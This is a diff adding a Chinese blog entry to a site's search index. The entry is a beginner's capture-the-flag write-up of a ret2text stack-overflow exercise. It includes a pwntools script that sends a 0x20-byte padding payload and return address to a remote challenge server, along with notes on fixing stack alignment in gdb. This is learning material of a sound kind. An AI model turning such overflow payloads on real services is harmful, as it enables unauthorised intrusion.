@@ -218,4 +218,62 @@
 <p>面向对象编程</p>
 ]]></content>
   </entry>
+  <entry>
+    <title>pwn初体验</title>
+    <url>/2024/11/27/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
+    <content><![CDATA[<p><strong>ret2text</strong></p>
+<p>1.先托入ide中查看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272027539.png" alt="image-20241127202727338"></p>
+<p>2.拖入ida中：</p>
+<p>![image-20241127192619944](<a href="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411271926129.png">https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411271926129.png</a></p>
+<p><img src="/2024/11/27/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/Users\hp\AppData\Roaming\Typora\typora-user-images\image-20241127203614027.png" alt="image-20241127203614027"></p>
+<p>1.分析函数：</p>
+<p>确认buf距离栈底20个字节（h为16进制）</p>
+<ol start="2">
+<li></li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411271931584.png" alt="image-20241127193117448"></p>
+<p>3.写脚本攻击服务器</p>
+<p>先在本地运行，（因为本地可以调试）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">p = process(<span class="hljs-string">&quot;./文件名&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>（文件名大小写没关系）</p>
+<p>payload:</p>
+<p>①距离为 0x20</p>
+<p>②地址要加 0x！！！！！</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;222.22.91.49&quot;</span>,<span class="hljs-string">&quot;32783&quot;</span>)<br><span class="hljs-comment"># gdb.attach(p,&#x27;b*0x00000000004011A2&#x27;)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> +p64(<span class="hljs-number">0x00000000004011A9</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<p>3：本题涉及栈平衡，因此这个地址不正确</p>
+<p>刚开始写的：(有两处错误)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272044812.png" alt="image-20241127204433735"></p>
+<p>开始写：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272054077.png" alt="image-20241127205438921"></p>
+<p>接着写payload:</p>
+<p>发现失败了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272106106.png" alt="image-20241127210607968"></p>
+<p>开始调试：</p>
+<p>添加：</p>
+<p>leave</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">gdb<span class="hljs-selector-class">.attach</span>(<span class="hljs-selector-tag">p</span>,<span class="hljs-string">&#x27;b*0x00000000004011A2&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272107049.png" alt="image-20241127210748905"></p>
+<p>运行：</p>
+<p>这个时候在pwning文件里面打开终端</p>
+<p>输入t（进入分屏）（CTRL＋d)</p>
+<p><img src="/2024/11/27/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/Users\hp\AppData\Roaming\Typora\typora-user-images\image-20241127213538953.png" alt="image-20241127213538953"></p>
+<p>输入c&#x2F;ni</p>
+<p>发现卡住了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272139275.png"></p>
+<p>这个时候发现movaps栈不平衡,</p>
+<p>回到IDA找到</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272143470.png" alt="image-20241127214303408"></p>
+<p>改地址：00000000004011A9</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272146052.png" alt="image-20241127214607982"></p>
+<p>改一下，运行，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272150785.png" alt="image-20241127215023656"></p>
+<p>改成远端就可以了</p>
+]]></content>
+  </entry>
 </search>
